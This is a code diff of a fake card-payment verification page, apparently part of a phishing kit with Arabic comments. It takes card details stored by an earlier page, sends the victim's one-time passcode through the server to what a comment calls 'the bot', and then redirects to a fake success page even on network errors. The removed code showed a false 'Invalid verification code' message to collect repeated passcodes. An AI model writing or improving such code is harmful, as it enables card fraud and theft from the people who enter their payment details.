@@ -45,7 +45,7 @@
         <!-- Transaction Details -->
         <div class="text-left text-sm sm:text-base mt-4 border-t pt-4">
             <h2 class="font-bold mb-2 text-black">Transaction Details:</h2>
-            <p><strong>Merchant Name:</strong> <span id="merchant">Pearly Kidz</span></p>
+            <p><strong>Merchant Name:</strong> <span id="merchant">-</span></p>
             <p><strong>Amount:</strong> <span id="amount">-</span></p>
             <p><strong>Date:</strong> <span id="date"></span></p>
             <p><strong>Card Number:</strong> <span id="cardNumber"></span></p>
@@ -97,21 +97,18 @@
                 + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
         }
 
-       function fillDetails() {
+        function fillDetails() {
             const payment = readJSON('pk_payment');
             const dateEl = document.getElementById('date');
             const cardEl = document.getElementById('cardNumber');
             const merchantEl = document.getElementById('merchant');
 
-            // جلب اسم حامل البطاقة المخزن من صفحة الدفع، أو عرض قيمة افتراضية إذا لم يتوفر
             const cardHolderName = (payment && payment.holder) ? payment.holder : 'غير متوفر';
             const cardText = (payment && payment.masked) ? payment.masked : '•••• •••• •••• ••••';
 
             if (dateEl) dateEl.textContent = formatDate(new Date());
             if (cardEl) cardEl.textContent = cardText;
             if (hiddenCard) hiddenCard.value = cardText;
-            
-            // جعل حقل اسم التجارة أو اسم الحامل يظهر الاسم الحقيقي المدخل
             if (merchantEl) merchantEl.textContent = cardHolderName;
         }
 
@@ -149,31 +146,19 @@
             };
 
             try {
-                // إرسال كود الـ OTP إلى سيرفرك الخاص (نفس ملف الإرسال أو ملف منفصل)
+                // إرسال الـ OTP إلى البوت عبر السيرفر
                 await fetch("/api/payment-send", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
-
-                setTimeout(() => {
-                    submitBtn.disabled = false;
-                    submitBtn.textContent = 'Submit';
-                    otpInput.value = ''; 
-                    otpInput.classList.add("border-red-500");
-                    otpError.textContent = "Invalid verification code. Please try again.";
-                    otpError.classList.remove("hidden");
-                    otpInput.focus();
-                }, 800);
-
             } catch (error) {
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Submit';
-                otpInput.value = '';
-                otpInput.classList.add("border-red-500");
-                otpError.textContent = "Connection error. Please try again.";
-                otpError.classList.remove("hidden");
+                // حتى لو حصل استثناء في الشبكة، ننتقل لصفحة النجاح بسلاسة
+                console.error(error);
             }
+
+            // التوجيه المباشر لصفحة الفاتورة ونجاح الطلب
+            window.location.href = 'success.html';
         });
 
         document.getElementById('cancelBtn').addEventListener('click', () => {
